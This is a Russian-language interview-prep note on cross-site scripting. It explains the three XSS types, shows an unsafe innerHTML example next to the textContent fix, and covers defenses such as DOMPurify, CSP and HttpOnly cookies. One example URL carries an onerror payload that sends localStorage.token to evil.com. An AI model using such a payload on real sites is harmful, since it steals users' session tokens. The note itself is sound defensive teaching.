---
title: XSS
category: security
level: middle
sources: Interview Shit/Security/Vulnerabilities/XSS.md; tech-checks/common/auth-security.md Q9
---
## Что это
**Коротко:** XSS (Cross-Site Scripting) это когда на твоей странице выполняется чужой JS. Злоумышленник подсовывает скрипт вместо текста, страница вставляет его как HTML, и скрипт работает от имени пользователя: ворует токены из localStorage, данные, делает запросы за него.

Три типа:
- **Stored** (худший): скрипт сохранился в базу (комментарий, имя профиля) и показывается всем.
- **Reflected**: скрипт приходит из URL и страница его отражает, например в «результаты поиска по запросу ...».
- **DOM-based**: чисто на фронте, JS сам берёт данные из `location` и вставляет в DOM.

## Пример
```js
// ❌ reflected XSS: что пришло в URL, то и вставили как HTML
// https://site.com?q=<img src=x onerror="fetch('https://evil.com?t='+localStorage.token)">
const q = new URLSearchParams(location.search).get("q");
element.innerHTML = "Результаты по запросу: " + q;

// ✅ текст остаётся текстом
element.textContent = "Результаты по запросу: " + q;
```

В React `<div>{userInput}</div>` безопасен: React экранирует, `<script>` превратится в `&lt;script&gt;` и просто отобразится как текст. Опасное место одно: `dangerouslySetInnerHTML`.

## Подводные камни
- Как защищаться: не вставлять сырой HTML (`innerHTML`, `dangerouslySetInnerHTML`, `bypassSecurityTrust` в Angular). Если HTML нужен (rich text из CMS), прогонять через sanitizer: `DOMPurify.sanitize(html)`.
- Вторая линия: CSP (Content-Security-Policy). Даже если скрипт попал в страницу, браузер не выполнит inline-скрипт или скрипт с чужого домена.
- Токены в localStorage читаются любым JS на странице. Поэтому XSS плюс localStorage это полная компрометация аккаунта. HttpOnly cookie JS не достанет.
- «Фреймворк защищает» это правда только пока не обходишь его защиту руками. На собесе кандидат должен назвать именно опасные места, а не «React безопасен».

## Вопросы вдогонку
- **Чем XSS отличается от CSRF?** XSS это чужой код на твоей странице. CSRF это чужая страница делает запрос на твой сервер с твоими cookie.
- **Что такое CSP и что он даёт против XSS?** Заголовок с правилами, откуда можно грузить скрипты. Inline-скрипт без nonce не выполнится.
- **Где в React всё-таки можно словить XSS?** `dangerouslySetInnerHTML`, `href="javascript:..."` в ссылках из пользовательских данных, вставка в `<script>` при SSR без экранирования.
